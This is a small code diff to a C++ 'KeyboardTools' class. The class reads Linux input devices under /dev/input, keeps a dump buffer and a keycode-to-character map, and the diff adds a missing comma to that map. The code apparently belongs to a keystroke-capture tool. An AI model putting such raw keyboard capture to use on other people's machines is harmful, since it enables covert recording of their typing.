@@ -7,7 +7,7 @@ class KeyboardTools{
 	FILE* outputfd;
 
         const char* iDevs="/proc/bus/input/devices";
-        const char* map="..1234567890-=\b\tqwertyuiop[]..asdfghjkl;'..\\zxcvbnm../";
+        const char* map="..1234567890-=\b\tqwertyuiop[]..asdfghjkl;'..\\zxcvbnm,./";
 
         char iPath[19]="/dev/input/";
         char  Dump[5000];
